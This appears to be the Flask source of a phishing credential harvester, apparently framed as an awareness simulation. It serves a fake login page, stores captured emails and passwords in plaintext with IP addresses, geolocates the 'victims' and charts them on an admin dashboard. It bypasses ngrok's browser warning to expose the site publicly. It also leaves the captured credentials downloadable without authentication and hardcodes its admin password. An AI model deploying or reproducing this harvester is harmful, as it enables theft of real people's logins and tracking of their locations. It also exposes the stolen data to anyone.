from flask import Flask, request, render_template, jsonify, send_file, session,redirect, url_for ,make_response
from datetime import datetime
import csv, os, requests
from collections import defaultdict, Counter

app = Flask(__name__)
@app.after_request
def skip_ngrok_warning(response):
    response.headers['ngrok-skip-browser-warning'] = 'true'
    return response


app.secret_key = 'supersecretkey'
# Constants
ADMIN_PASSWORD = "Admin@Phish2025"
LOG_DIR = 'logs'
CSV_FILE = os.path.join(LOG_DIR, 'credentials.csv')
location_cache = {}

# Ensure log directory and file
os.makedirs(LOG_DIR, exist_ok=True)
if not os.path.isfile(CSV_FILE):
    with open(CSV_FILE, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['username', 'password', 'ip', 'timestamp'])


# Backend location resolver (cached)
def get_location(ip):
    if ip in location_cache:
        return location_cache[ip]

    if ip.startswith("127.") or ip == "::1":
        location_cache[ip] = "Localhost"
        return "Localhost"

    try:
        res = requests.get(f"https://ipinfo.io/{ip}/json")
        res.raise_for_status()
        data = res.json()

        loc = ", ".join(part for part in [data.get("city", ""), data.get("region", ""), data.get("country", "")] if part)
        location = loc if loc else "Unknown"

        location_cache[ip] = location
        return location

    except Exception as e:
        print(f"[ERROR] Failed to fetch location for {ip}: {e}")
        location_cache[ip] = "Unknown"
        return "Unknown"

# ----------- ROUTES -----------

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login')
def login_page():
    return render_template('fake-login-page.html')

@app.route('/log', methods=['POST'])
def log_credentials():
    username = request.form.get('email')
    password = request.form.get('password')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    

    with open(CSV_FILE, mode='a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([username, password, ip, timestamp])

    return redirect(url_for('awareness_page'))

@app.route('/awareness')
def awareness_page():
    return render_template('awareness.html')

# Admin login page
@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == ADMIN_PASSWORD:
            session['is_admin'] = True  # ✅ Consistent key
            return redirect(url_for('admin_dashboard'))
        else:
            return "Incorrect password", 401
    return render_template('admin-login.html')


@app.route('/admin')
def admin_dashboard():
    if not session.get('is_admin'):
         return redirect('/admin-login')  
     
    credentials = []

    # Ensure file exists
    if os.path.isfile(CSV_FILE):
        with open(CSV_FILE, newline='') as f:
            reader = csv.DictReader(f)
            for row in reader:
                credentials.append({
                    "username": row.get("username", "N/A"),
                    "password": row.get("password", "N/A"),
                    "timestamp": row.get("timestamp", "N/A"),
                    "ip": row.get("ip")
                    
                })

    return render_template('admin.html', data=credentials, total=len(credentials))

@app.route('/verify-admin', methods=['POST'])
def verify_admin():
    entered_password = request.form.get('admin_password')
    if entered_password == ADMIN_PASSWORD:
        session['is_admin'] = True
        return redirect(url_for('admin_dashboard'))
    return "Unauthorized", 403

# Logout and redirect to phishing homepage
@app.route('/logout')
def logout():
    session.pop('is_admin', None)  # ✅ Matches login key
    return redirect('/')


@app.route('/download')
def download_csv():
    return send_file(CSV_FILE, as_attachment=True)

# ----------- APIs -----------

@app.route('/api/data')
def get_data():
    data = []
    with open(CSV_FILE, newline='') as f:
        reader = csv.DictReader(f)
        for row in reader:
            cleaned = {k.strip(): v.strip() for k, v in row.items()}  # FIX HERE
            data.append(cleaned)
    return jsonify(data)

@app.route('/api/location')
def resolve_location():
    ip = request.args.get("ip", "")
    if ip in location_cache:
        return jsonify(location_cache[ip])  # Return full object

    try:
        res = requests.get(f"https://ipinfo.io/{ip}/json")
        res.raise_for_status()
        data = res.json()

        city = data.get("city", "")
        region = data.get("region", "")
        country = data.get("country", "")
        loc = data.get("loc", "")  # This is a string like "19.07,72.88"

        location = ", ".join(part for part in [city, region, country] if part)

        latitude, longitude = loc.split(",") if loc else ("", "")

        result = {
            "location": location or "Unknown",
            "latitude": latitude,
            "longitude": longitude
        }

        location_cache[ip] = result
        return jsonify(result)

    except Exception as e:
        print(f"[ERROR] Failed to get location for {ip}: {e}")
        return jsonify({"location": "Unknown", "latitude": "", "longitude": ""})


@app.route('/api/summary')
def summary():
    total = 0
    unique_ips = set()
    ip_map = Counter()
    with open(CSV_FILE, newline='') as f:
        reader = csv.DictReader(f)
        for row in reader:
            total += 1
            ip = row.get('ip', '')
            if ip:
                unique_ips.add(ip)
                ip_map[ip] += 1
    return jsonify({
        "total_victims": total,
        "unique_ips": len(unique_ips),
        "top_ips": ip_map.most_common(5)
    })

@app.route('/api/chart-data')
def chart_data():
    freq = request.args.get('freq', 'hour')  # freq = hour or day
    counts = defaultdict(int)
    with open(CSV_FILE, newline='') as f:
        reader = csv.DictReader(f)
        for row in reader:
            timestamp = row.get('timestamp')
            if timestamp:
                key = timestamp[:13] if freq == 'hour' else timestamp[:10]
                counts[key] += 1
    sorted_items = sorted(counts.items())
    return jsonify({
        "labels": [k for k, _ in sorted_items],
        "data": [v for _, v in sorted_items]
    })

if __name__ == '__main__':
    app.run(debug=True)
